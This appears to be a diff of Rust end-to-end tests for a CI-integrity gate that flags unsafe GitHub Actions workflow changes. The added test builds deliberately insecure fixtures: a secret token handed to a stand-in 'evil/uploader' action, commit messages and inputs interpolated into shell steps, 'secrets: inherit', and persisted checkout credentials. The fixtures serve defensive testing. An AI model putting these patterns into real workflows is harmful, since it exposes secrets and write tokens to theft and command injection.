@@ -9284,7 +9284,7 @@ fn ci_integrity_gate_e2e() {
     // Case 2: Unpinned action (third-party)
     repo.write(
         ".github/workflows/ci.yml",
-        "name: CI\njobs:\n  lint:\n    runs-on: ubuntu-latest\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: codecov/codecov-action@v4\n  ci-gate:\n    needs: [lint, test]\n    runs-on: ubuntu-latest\n",
+        "name: CI\njobs:\n  lint:\n    runs-on: ubuntu-latest\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          persist-credentials: false\n      - uses: codecov/codecov-action@v4\n  ci-gate:\n    needs: [lint, test]\n    runs-on: ubuntu-latest\n",
     );
     repo.commit("ci: unpinned action");
     let run_unpinned = repo.check(&["--base", "HEAD~1"]);
@@ -9297,7 +9297,7 @@ fn ci_integrity_gate_e2e() {
     // Pinned action with SHA -> passes (actions/checkout@v4 is already on the base side)
     repo.write(
         ".github/workflows/ci.yml",
-        "name: CI\njobs:\n  lint:\n    runs-on: ubuntu-latest\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: codecov/codecov-action@b4ffde65f46336ab88eb53be808477a3936bae11\n  ci-gate:\n    needs: [lint, test]\n    runs-on: ubuntu-latest\n",
+        "name: CI\njobs:\n  lint:\n    runs-on: ubuntu-latest\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          persist-credentials: false\n      - uses: codecov/codecov-action@b4ffde65f46336ab88eb53be808477a3936bae11\n  ci-gate:\n    needs: [lint, test]\n    runs-on: ubuntu-latest\n",
     );
     repo.commit("ci: pinned action with commit SHA");
     let run_pinned = repo.check(&["--base", "HEAD~1"]);
@@ -14162,7 +14162,7 @@ fn ci_integrity_holds_actions_and_github_refs_to_the_sha_rule_by_default() {
     let sha = "b4ffde65f46336ab88eb53be808477a3936bae11";
     let base = "on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo\n";
     let head = format!(
-        "on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: github/codeql-action/init@v3\n      - uses: actions/setup-node@{sha}\n      - run: echo\n"
+        "on: push\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          persist-credentials: false\n      - uses: github/codeql-action/init@v3\n      - uses: actions/setup-node@{sha}\n      - run: echo\n"
     );
     for opt_back_in in [false, true] {
         let repo = Repo::new();
@@ -14299,4 +14299,101 @@ fn ci_integrity_banned_actions_are_reported_across_the_whole_tree() {
     let bad = repo.check(&[]);
     assert_eq!(bad.code, 2, "{}{}", bad.stdout, bad.stderr);
     assert!(bad.stderr.contains("not-a-repo"), "{}", bad.stderr);
+}
+
+#[test]
+fn ci_integrity_reports_workflow_changes_that_expose_secrets_or_a_write_token() {
+    const WF: &str = ".github/workflows/w.yml";
+    const ACTION: &str = ".github/actions/greet/action.yml";
+    let sha = "b4ffde65f46336ab88eb53be808477a3936bae11";
+    let base = format!(
+        "on:\n  push:\npermissions:\n  contents: write\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@{sha}\n        with:\n          persist-credentials: false\n      - env:\n          MSG: ${{{{ github.event.head_commit.message }}}}\n        run: echo \"$MSG\"\n"
+    );
+    let head = format!(
+        "on:\n  push:\n  schedule:\n    - cron: '0 0 * * *'\npermissions:\n  contents: write\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@{sha}\n      - run: echo \"${{{{ github.event.head_commit.message }}}}\"\n      - uses: evil/uploader@{sha}\n        with:\n          token: ${{{{ secrets.UPLOAD }}}}\n  call:\n    uses: ./.github/workflows/r.yml\n    secrets: inherit\n"
+    );
+    let action_base = "name: greet\ndescription: d\ninputs:\n  who:\n    description: w\nruns:\n  using: composite\n  steps:\n    - run: echo \"$WHO\"\n      shell: bash\n      env:\n        WHO: ${{ inputs.who }}\n";
+    let action_head = action_base.replace(
+        "    - run: echo \"$WHO\"\n",
+        "    - run: echo \"${{ inputs.who }}\"\n",
+    );
+    let repo = Repo::new();
+    repo.commit_base_files(&[(WF, &base), (ACTION, action_base)], "ci: base");
+
+    // Negative control: the base side, an env: binding read as "$MSG", reports nothing.
+    repo.write("README.md", "x\n");
+    repo.commit("docs: readme");
+    assert!(ci_codes(&repo.check(&[])).is_empty());
+
+    repo.write(WF, &head);
+    repo.write(ACTION, &action_head);
+    repo.commit("ci: expose");
+    let run = repo.check(&[]);
+    let found = ci_codes(&run);
+    let mut codes: Vec<&str> = found.iter().map(|(c, _)| c.as_str()).collect();
+    codes.sort();
+    assert_eq!(
+        codes,
+        vec![
+            "ci-integrity/checkout-persists-credentials",
+            "ci-integrity/schedule-trigger-with-secrets",
+            "ci-integrity/secrets-inherit",
+            "ci-integrity/secrets-with-third-party-action",
+            "ci-integrity/template-injection",
+            "ci-integrity/template-injection",
+        ],
+        "{found:?}"
+    );
+    assert!(
+        found
+            .iter()
+            .all(|(_, m)| m.contains("added by this change")),
+        "{found:?}"
+    );
+    // Location and expression text only.
+    let injection: Vec<_> = run
+        .violations("ci-integrity")
+        .into_iter()
+        .filter(|v| v["code"] == "ci-integrity/template-injection")
+        .map(|v| (v["file"].as_str().unwrap().to_string(), v["line"].as_u64()))
+        .collect();
+    assert!(
+        injection.contains(&(WF.to_string(), Some(12))),
+        "{injection:?}"
+    );
+    assert!(
+        injection.contains(&(ACTION.to_string(), Some(9))),
+        "{injection:?}"
+    );
+    assert_eq!(run.code, 1, "{}", run.stdout);
+
+    // A scoped directive lifts its own pattern only; the gate-wide one lifts all.
+    let scoped = repo.check_with_pr(&[], "allow-ci-weakening: template-injection reviewed");
+    let left: Vec<String> = ci_codes(&scoped).into_iter().map(|(c, _)| c).collect();
+    assert_eq!(left.len(), 4, "{left:?}");
+    assert!(
+        !left.iter().any(|c| c.ends_with("template-injection")),
+        "{left:?}"
+    );
+    let all = repo.check_with_pr(&[], "allow-gate-weakening: ci-integrity reviewed");
+    assert!(ci_codes(&all).is_empty(), "{}", all.stdout);
+
+    // Already on the base side: not reported by default, reported as pre-existing with
+    // diff_only = false.
+    let repo = Repo::new();
+    repo.commit_base_files(&[(WF, &head), (ACTION, &action_head)], "ci: base");
+    repo.write(WF, &head.replace("cron: '0 0 * * *'", "cron: '0 1 * * *'"));
+    repo.write(ACTION, &action_head.replace("name: greet", "name: hello"));
+    repo.commit("ci: reword");
+    assert!(ci_codes(&repo.check(&[])).is_empty());
+    let full = repo.check(&[
+        "--config-override",
+        "[gates.ci-integrity]\ndiff_only = false\n",
+    ]);
+    let found = ci_codes(&full);
+    assert_eq!(found.len(), 6, "{found:?}");
+    assert!(
+        found.iter().all(|(_, m)| m.contains("pre-existing")),
+        "{found:?}"
+    );
 }
